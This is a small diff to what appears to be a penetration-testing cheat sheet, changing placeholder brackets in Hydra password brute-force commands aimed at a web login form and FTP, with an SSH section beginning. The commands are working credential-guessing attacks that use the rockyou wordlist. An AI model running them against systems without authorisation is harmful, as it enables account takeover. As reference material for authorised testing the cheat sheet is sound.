@@ -14,9 +14,9 @@ $ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.p
 
 ## FTP
 
-$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt <IP Address> ftp
+$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt [IP Address] ftp
 
-$ hydra -L /dir/users.txt -P /dir/passlist.txt ftp://<IP_Address>
+$ hydra -L /dir/users.txt -P /dir/passlist.txt ftp://[IP_Address]
 
 ## SSH
 
